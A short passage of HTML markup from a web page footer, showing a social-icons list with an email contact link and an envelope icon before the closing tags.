social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>